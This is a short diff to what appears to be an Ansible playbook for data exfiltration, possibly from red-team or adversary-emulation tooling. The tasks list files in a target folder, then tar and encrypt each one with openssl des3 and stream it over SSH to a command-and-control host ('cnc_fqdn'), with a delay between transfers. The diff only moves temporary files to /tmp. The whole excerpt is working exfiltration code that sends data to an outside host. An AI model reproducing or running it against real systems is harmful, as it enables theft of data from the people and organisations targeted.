@@ -17,13 +17,13 @@
       
     - name: Grab files names form exfiltration_folder and exfl over SSH
       tags: SSH
-      shell: find . -maxdepth 1 -type f | cut -d'/' -f2
+      shell: find . -maxdepth 1 -type f | cut -d'/' -f2 > /tmp/list
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files
     - shell: |
-        pwd > path
-        echo tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} >> path
+        pwd > /tmp/path
+        echo tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} >> /tmp/path
         tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
         sleep {{ exfil_delay }}
       args:
